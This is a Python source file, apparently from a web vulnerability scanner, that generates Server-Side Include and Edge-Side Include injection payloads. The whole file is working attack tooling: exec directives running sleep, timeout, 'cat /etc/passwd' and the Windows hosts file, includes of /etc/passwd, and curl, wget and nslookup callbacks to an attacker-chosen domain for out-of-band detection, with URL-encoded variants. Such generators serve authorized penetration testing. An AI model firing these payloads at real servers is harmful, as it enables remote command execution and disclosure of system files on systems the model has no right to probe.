import urllib.parse



class SSIPayloadGenerator():
    def __init__(self):
        super().__init__()
        self.directive_template = '<!--#DIRECTIVE param="PAYLOAD" -->'

        self.commands = [
            ('windows','reflection','echo UNIQUE'),
            ('windows','timeout','timeout /T TIMEOUT'),
            ('windows','reflection','type C:\\Windows\\System32\\drivers\\etc\\hosts'),
            ('windows','oast','wget http://DOMAIN/UNIQUE'),
            ('windows','oast','curl http://DOMAIN/UNIQUE'),
            ('windows','oast','nslookup DOMAIN'),
            ('linux','reflection','echo UNIQUE'),
            ('linux','timeout','sleep TIMEOUT'),
            ('linux','reflection','cat /etc/passwd'),
            ('linux','oast','curl http://DOMAIN/UNIQUE'),
            ('linux','oast','wget http://DOMAIN/UNIQUE'),
            ('linux','oast','nslookup DOMAIN'),
        ]

        self.domain = ""
        self.unique_string = ""
        self.sleep_timeout = ""
        self.platforms = ['linux', 'windows']
        self.url_encode_payloads = False

    def change_templates(self,payloads):
        return [p.replace("DOMAIN", self.domain).replace("UNIQUE", self.unique_string).replace("TIMEOUT", str(self.sleep_timeout)) 
                for p in payloads
                ]

    def generate_time_based_payloads(self):
        templates = [
            f'<!--#exec cmd="PAYLOAD" -->',
        ]

        commands = self.change_templates([c[2] for c in self.commands if c[0] in self.platforms and c[1] == 'timeout'])

        templates = self.change_templates(templates)

        payloads = [t.replace("PAYLOAD",c) for t in templates for c in commands]    

        if self.url_encode_payloads:
            url_encoded = self.url_encode(payloads)
            payloads.extend(url_encoded)
        return list(set(payloads))

    def generate_oast_payloads(self):
        templates = [
            f'<!--#include file="\\\\DOMAIN\\UNIQUE" -->',
            f'<!--#exec cmd="PAYLOAD" -->',
            f'<esi:include src=http://DOMAIN/UNIQUE>',
            f'<esi:include src="\\\\DOMAIN\\UNIQUE">',
        ]     

        commands = self.change_templates([c[2] for c in self.commands if c[0] in self.platforms and c[1] == 'oast'])

        templates = self.change_templates(templates)

        payloads = [t.replace("PAYLOAD",c) for t in templates for c in commands]    

        if self.url_encode_payloads:
            url_encoded = self.url_encode(payloads)
            payloads.extend(url_encoded)
        return list(set(payloads))
    
    def generate_reflective_payloads(self):
        templates = [
            f'<!--#echo var="UNIQUE" -->',
            f'<!--#include file="PAYLOAD" -->',
            f'<!--#exec cmd="PAYLOAD" -->',
            f'<esi:include src="PAYLOAD">',
            f'<!--esi $add_header("SSIHEADER","UNIQUE") -->',
        ]    

        commands = self.change_templates([c[2] for c in self.commands if c[0] in self.platforms and c[1] == 'reflection'])

        templates = self.change_templates(templates)

        payloads = [t.replace("PAYLOAD",c) for t in templates for c in commands]    

        if self.url_encode_payloads:
            url_encoded = self.url_encode(payloads)
            payloads.extend(url_encoded)
        
        return list(set(payloads))

    def generate_payloads(self):

        result = [
            f'<!--#echo var="{self.unique_string}" -->',
            f'<!--#include file="/etc/passwd" -->',
            f'<!--#exec cmd="sleep {str(self.sleep_timeout)}" -->',
            f'<!--#exec cmd="timeout /T {str(self.sleep_timeout)}" -->',
            f'<!--#exec cmd="echo {self.unique_string}" -->',
            f'<!--#exec cmd="cat /etc/passwd" -->',
            f'<!--#exec cmd="wget http://{self.domain}" -->',
            f'<!--#exec cmd="curl http://{self.domain}" -->',
            f'<!--#exec cmd="nslookup {self.domain}" -->',
            f'<esi:include src=http://{self.domain}/{self.unique_string}>',
            f'<esi:include src="/etc/passwd">',
            f'<!--esi $add_header("Pluck","{self.unique_string}") -->',
        ]        

        encoded = self.url_encode(result)
        result.extend(encoded)

        return result





    def url_encode(self, lista):
        return [urllib.parse.quote(p) for p in lista]

